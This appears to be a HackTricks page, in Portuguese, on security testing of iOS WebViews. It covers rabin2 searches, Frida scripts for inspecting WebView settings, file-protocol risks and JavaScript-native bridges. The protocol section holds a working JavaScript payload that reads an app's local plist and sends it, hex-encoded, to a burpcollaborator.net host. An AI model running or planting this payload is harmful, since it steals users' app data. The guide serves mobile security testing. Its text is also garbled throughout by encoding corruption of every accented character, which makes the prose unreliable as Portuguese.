# WebViews do iOS

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

O c√≥digo desta p√°gina foi extra√≠do [aqui](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md). Verifique a p√°gina para mais detalhes.


## Tipos de WebViews

WebViews s√£o utilizados em aplicativos para exibir conte√∫do da web de forma interativa. V√°rios tipos de WebViews oferecem diferentes funcionalidades e recursos de seguran√ßa para aplicativos iOS. Aqui est√° uma breve vis√£o geral:

- **UIWebView**, que n√£o √© mais recomendado a partir do iOS 12 devido √† falta de suporte para desabilitar **JavaScript**, tornando-o suscet√≠vel a inje√ß√£o de script e ataques de **Cross-Site Scripting (XSS)**.

- **WKWebView** √© a op√ß√£o preferida para incorporar conte√∫do da web em aplicativos, oferecendo controle aprimorado sobre o conte√∫do e recursos de seguran√ßa. O **JavaScript** √© habilitado por padr√£o, mas pode ser desativado se necess√°rio. Ele tamb√©m suporta recursos para evitar que o JavaScript abra automaticamente janelas e garante que todo o conte√∫do seja carregado com seguran√ßa. Al√©m disso, a arquitetura do **WKWebView** minimiza o risco de corrup√ß√£o de mem√≥ria afetando o processo principal do aplicativo.

- **SFSafariViewController** oferece uma experi√™ncia de navega√ß√£o na web padronizada dentro dos aplicativos, reconhec√≠vel por seu layout espec√≠fico, incluindo um campo de endere√ßo somente leitura, bot√µes de compartilhamento e navega√ß√£o, e um link direto para abrir o conte√∫do no Safari. Ao contr√°rio do **WKWebView**, o **JavaScript** n√£o pode ser desativado no **SFSafariViewController**, que tamb√©m compartilha cookies e dados com o Safari, mantendo a privacidade do usu√°rio a partir do aplicativo. Ele deve ser exibido de forma proeminente de acordo com as diretrizes da App Store.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## Resumo da Explora√ß√£o da Configura√ß√£o de WebViews

### **Vis√£o Geral da An√°lise Est√°tica**

No processo de examinar as configura√ß√µes de **WebViews**, dois tipos principais s√£o focados: **UIWebView** e **WKWebView**. Para identificar essas WebViews dentro de um bin√°rio, comandos s√£o utilizados, buscando por refer√™ncias de classes espec√≠ficas e m√©todos de inicializa√ß√£o.

- **Identifica√ß√£o de UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
Este comando ajuda a localizar inst√¢ncias de **UIWebView** ao procurar por strings de texto relacionadas a ele no bin√°rio.

- **Identifica√ß√£o do WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
Da mesma forma, para o **WKWebView**, este comando pesquisa o bin√°rio por strings de texto indicativas de seu uso.

Al√©m disso, para encontrar como um **WKWebView** √© inicializado, o seguinte comando √© executado, visando a assinatura do m√©todo relacionado √† sua inicializa√ß√£o:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **Verifica√ß√£o de Configura√ß√£o do JavaScript**

Para o **WKWebView**, √© destacado que desativar o JavaScript √© uma pr√°tica recomendada, a menos que seja necess√°rio. O bin√°rio compilado √© pesquisado para confirmar que a propriedade `javaScriptEnabled` est√° definida como `false`, garantindo que o JavaScript esteja desativado:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **Apenas Verifica√ß√£o de Conte√∫do Seguro**

**WKWebView** oferece a capacidade de identificar problemas de conte√∫do misto, em contraste com **UIWebView**. Isso √© verificado usando a propriedade `hasOnlySecureContent` para garantir que todos os recursos da p√°gina sejam carregados por meio de conex√µes seguras. A busca no bin√°rio compilado √© realizada da seguinte forma:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **Informa√ß√µes de An√°lise Din√¢mica**

A an√°lise din√¢mica envolve a inspe√ß√£o do heap em busca de inst√¢ncias de WebView e suas propriedades. Um script chamado `webviews_inspector.js` √© usado para esse fim, visando inst√¢ncias de `UIWebView`, `WKWebView` e `SFSafariViewController`. Ele registra informa√ß√µes sobre as inst√¢ncias encontradas, incluindo URLs e configura√ß√µes relacionadas a JavaScript e conte√∫do seguro.

A inspe√ß√£o do heap pode ser realizada usando `ObjC.choose()` para identificar inst√¢ncias de WebView e verificar as propriedades `javaScriptEnabled` e `hasonlysecurecontent`.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

O script √© executado com:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**Resultados Chave**:
- Inst√¢ncias de WebViews s√£o localizadas e inspecionadas com sucesso.
- A ativa√ß√£o do JavaScript e as configura√ß√µes de conte√∫do seguro s√£o verificadas.

Este resumo encapsula os passos cr√≠ticos e comandos envolvidos na an√°lise das configura√ß√µes do WebView por meio de abordagens est√°ticas e din√¢micas, focando em recursos de seguran√ßa como a ativa√ß√£o do JavaScript e detec√ß√£o de conte√∫do misto.

## Manipula√ß√£o de Protocolo do WebView

Manipular conte√∫do em WebViews √© um aspecto cr√≠tico, especialmente ao lidar com v√°rios protocolos como `http(s)://`, `file://` e `tel://`. Esses protocolos permitem o carregamento de conte√∫do remoto e local dentro dos aplicativos. √â enfatizado que ao carregar conte√∫do local, precau√ß√µes devem ser tomadas para evitar que os usu√°rios influenciem o nome ou caminho do arquivo e editem o conte√∫do em si.

**WebViews** oferecem diferentes m√©todos para carregar conte√∫do. Para **UIWebView**, agora obsoleto, s√£o utilizados m√©todos como `loadHTMLString:baseURL:` e `loadData:MIMEType:textEncodingName:baseURL:`. **WKWebView**, por outro lado, emprega `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:` e `loadRequest:` para conte√∫do web. M√©todos como `pathForResource:ofType:`, `URLForResource:withExtension:` e `init(contentsOf:encoding:)` s√£o tipicamente utilizados para carregar arquivos locais. O m√©todo `loadFileURL:allowingReadAccessToURL:` √© particularmente not√°vel por sua capacidade de carregar um URL ou diret√≥rio espec√≠fico no WebView, potencialmente expondo dados sens√≠veis se um diret√≥rio for especificado.

Para encontrar esses m√©todos no c√≥digo-fonte ou bin√°rio compilado, comandos como os seguintes podem ser usados:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
Em rela√ß√£o ao **acesso a arquivos**, o UIWebView permite universalmente, enquanto o WKWebView introduz configura√ß√µes `allowFileAccessFromFileURLs` e `allowUniversalAccessFromFileURLs` para gerenciar o acesso a URLs de arquivos, sendo ambas falsas por padr√£o.

Um exemplo de script Frida √© fornecido para inspecionar as configura√ß√µes de seguran√ßa do **WKWebView**:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
Por √∫ltimo, um exemplo de um payload JavaScript destinado a exfiltrar arquivos locais demonstra o risco de seguran√ßa potencial associado a WebViews mal configurados. Este payload codifica o conte√∫do do arquivo em formato hexadecimal antes de transmiti-los para um servidor, destacando a import√¢ncia de medidas de seguran√ßa rigorosas nas implementa√ß√µes de WebViews.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## M√©todos Nativos Expostos Atrav√©s de WebViews

## Compreendendo as Interfaces Nativas da WebView no iOS

A partir do iOS 7, a Apple forneceu APIs para **comunica√ß√£o entre JavaScript em uma WebView e objetos nativos** Swift ou Objective-C. Essa integra√ß√£o √© principalmente facilitada por meio de dois m√©todos:

- **JSContext**: Uma fun√ß√£o JavaScript √© criada automaticamente quando um bloco Swift ou Objective-C √© vinculado a um identificador dentro de um `JSContext`. Isso permite uma integra√ß√£o e comunica√ß√£o perfeitas entre JavaScript e c√≥digo nativo.
- **JSExport Protocol**: Ao herdar o protocolo `JSExport`, propriedades nativas, m√©todos de inst√¢ncia e m√©todos de classe podem ser expostos ao JavaScript. Isso significa que quaisquer altera√ß√µes feitas no ambiente JavaScript s√£o refletidas no ambiente nativo, e vice-versa. No entanto, √© essencial garantir que dados sens√≠veis n√£o sejam expostos inadvertidamente por meio deste m√©todo.

### Acessando `JSContext` em Objective-C

Em Objective-C, o `JSContext` para um `UIWebView` pode ser recuperado com a seguinte linha de c√≥digo:
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### Comunica√ß√£o com `WKWebView`

Para `WKWebView`, o acesso direto ao `JSContext` n√£o est√° dispon√≠vel. Em vez disso, a passagem de mensagens √© utilizada atrav√©s da fun√ß√£o `postMessage`, permitindo a comunica√ß√£o entre JavaScript e nativo. Os manipuladores para essas mensagens s√£o configurados da seguinte forma, permitindo que o JavaScript interaja com o aplicativo nativo de forma segura:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Intera√ß√£o e Teste

O JavaScript pode interagir com a camada nativa ao definir um manipulador de mensagens de script. Isso permite opera√ß√µes como invocar fun√ß√µes nativas a partir de uma p√°gina da web:
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Para capturar e manipular o resultado de uma chamada de fun√ß√£o nativa, pode-se substituir a fun√ß√£o de retorno dentro do HTML:
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
O lado nativo lida com a chamada JavaScript conforme mostrado na classe `JavaScriptBridgeMessageHandler`, onde o resultado de opera√ß√µes como a multiplica√ß√£o de n√∫meros √© processado e enviado de volta para o JavaScript para exibi√ß√£o ou manipula√ß√£o adicional:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## Depura√ß√£o de WebViews no iOS

(Tutorial baseado no [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

Para depurar efetivamente o conte√∫do da web dentro de WebViews no iOS, √© necess√°rio um setup espec√≠fico envolvendo as ferramentas de desenvolvedor do Safari, devido ao fato de que as mensagens enviadas para `console.log()` n√£o s√£o exibidas nos logs do Xcode. Aqui est√° um guia simplificado, enfatizando etapas e requisitos-chave:

- **Prepara√ß√£o no Dispositivo iOS**: O Safari Web Inspector precisa ser ativado no seu dispositivo iOS. Isso √© feito indo para **Configura√ß√µes > Safari > Avan√ßado**, e habilitando o _Web Inspector_.

- **Prepara√ß√£o no Dispositivo macOS**: Em sua m√°quina de desenvolvimento macOS, voc√™ deve habilitar as ferramentas de desenvolvedor dentro do Safari. Inicie o Safari, acesse **Safari > Prefer√™ncias > Avan√ßado**, e selecione a op√ß√£o _Mostrar menu Desenvolver_.

- **Conex√£o e Depura√ß√£o**: Ap√≥s conectar seu dispositivo iOS ao seu computador macOS e iniciar seu aplicativo, use o Safari em seu dispositivo macOS para selecionar a WebView que deseja depurar. Navegue at√© _Desenvolver_ na barra de menu do Safari, passe o mouse sobre o nome do seu dispositivo iOS para ver uma lista de inst√¢ncias de WebView, e selecione a inst√¢ncia que deseja inspecionar. Uma nova janela do Safari Web Inspector ser√° aberta para esse prop√≥sito.

No entanto, esteja ciente das limita√ß√µes:

- Depurar com este m√©todo requer um dispositivo macOS, pois depende do Safari.
- Apenas WebViews em aplicativos carregados em seu dispositivo atrav√©s do Xcode s√£o eleg√≠veis para depura√ß√£o. WebViews em aplicativos instalados via App Store ou Apple Configurator n√£o podem ser depurados dessa maneira.


## Refer√™ncias

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
